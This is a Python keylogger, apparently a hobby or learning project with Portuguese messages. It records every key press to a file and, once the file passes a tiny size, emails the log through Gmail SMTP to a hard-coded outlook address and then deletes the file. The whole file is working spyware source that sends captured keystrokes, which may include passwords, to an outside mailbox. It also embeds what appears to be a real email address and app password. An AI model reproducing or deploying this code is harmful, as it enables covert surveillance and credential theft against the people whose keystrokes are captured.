from pynput.keyboard import Listener, Key
import sys
import random
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import os
import pythoncom
import smtplib

def encerrar_programa():
    print("programa encerrado!")
    sys.exit()

log = f'yek{random.randint(0, 1000)}.txt'

def escreveKey(key):
    try:
        with open(log, "a+") as file:
            file.write(f'{key} \n')
            
    except Exception as e:
        print(f'Erro ao capturar a tecla {e}')
        encerrar_programa()

    size = os.stat(log).st_size
    pythoncom.CoInitialize()

    if size >= 10:
        send_log();
        os.remove(log)

    if key == Key.pause:
        encerrar_programa()

def send_log():
    try:
        email = 'exiled404exec@gmail.com'
        password = 'ofunvzlkxomxmejw'
        recipient_email = 'gelanlucas@outlook.com'

        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = recipient_email
        msg['Subject'] = 'Relatório keylogger'

        with open(log, 'r') as file:
            content = file.read()

        body = MIMEText(content)
        msg.attach(body)

        with open(log, 'rb') as file:
            attachment = MIMEApplication(file.read(), Name=os.path.basename(log))
        attachment['Content-Disposition'] = f'attachment; filename="{os.path.basename(log)}"'
        msg.attach(attachment)

        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(email, password)

        with open(log, 'r') as file:
            content = file.read()

        server.sendmail(email, recipient_email, msg.as_string())
        server.quit()

        print('Email enviado com sucesso.')
    except Exception as e:
        print('Ocorreu um erro ao enviar o email:', e)

with Listener(on_press=escreveKey) as logs:
    try:
        logs.join()
    except Exception as e:
        print('Erro durante a execução do programa')
    finally:
        logs.stop()